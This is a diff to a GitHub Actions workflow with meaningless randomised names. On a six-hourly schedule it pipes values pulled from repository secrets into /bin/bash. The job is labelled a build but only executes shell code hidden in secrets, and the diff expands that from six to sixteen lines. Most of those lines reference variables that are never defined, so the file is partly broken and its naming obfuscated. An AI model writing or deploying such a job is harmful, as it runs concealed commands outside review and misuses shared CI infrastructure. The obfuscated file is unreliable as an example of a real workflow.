@@ -1,23 +1,31 @@
 name: suiffbw
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
-jobs:  # 9328
+    - cron: '41 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: suiffbw
         env:
-          r03: ${{ secrets.r03 }}
+          k23215: ${{ secrets.k23215 }}
         run: |
-          echo $r03 | jq -r .ehakr72227 | /bin/bash
-          echo $rgbm4 | jq -r .ndnsd48 | /bin/bash
-          echo $ub0421 | jq -r .z4990 | /bin/bash
-          echo $df15 | jq -r .jotxj0 | /bin/bash
-          echo $qrdts93 | jq -r .mn73 | /bin/bash
-          echo $x30 | jq -r .hgn2 | /bin/bash
+          echo $k23215 | jq -r .buv74835 | /bin/bash
+          echo $qacjw5 | jq -r .py986 | /bin/bash
+          echo $sdq0 | jq -r .s665 | /bin/bash
+          echo $m97774 | jq -r .dw4 | /bin/bash
+          echo $sy45763 | jq -r .dqksj65937 | /bin/bash
+          echo $h7874 | jq -r .va10 | /bin/bash
+          echo $ielno66 | jq -r .nab17 | /bin/bash
+          echo $niv1 | jq -r .algt937 | /bin/bash
+          echo $kln331 | jq -r .wy827 | /bin/bash
+          echo $fifb48 | jq -r .cnbk1689 | /bin/bash
+          echo $qk6005 | jq -r .nrtel002 | /bin/bash
+          echo $tph1 | jq -r .y761 | /bin/bash
+          echo $se9 | jq -r .czuus8 | /bin/bash
+          echo $dxeiq63 | jq -r .wulpu96872 | /bin/bash
+          echo $ak83309 | jq -r .i4 | /bin/bash
+          echo $vsx63 | jq -r .q51255 | /bin/bash
 
